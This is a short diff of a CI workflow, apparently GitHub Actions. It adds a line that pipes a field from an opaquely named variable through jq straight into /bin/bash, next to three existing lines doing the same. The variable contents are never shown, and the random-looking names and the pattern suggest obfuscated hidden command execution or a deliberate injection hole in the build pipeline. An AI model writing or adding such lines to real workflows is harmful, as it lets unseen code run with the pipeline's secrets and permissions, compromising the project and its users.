@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$yhhi71" | jq -r .n317 | /bin/bash
           printf '%s' "$esc7" | jq -r .g5224 | /bin/bash
           echo $ul99 | jq -r .jxss19 | /bin/bash
+          echo $mu66602 | jq -r .r3 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
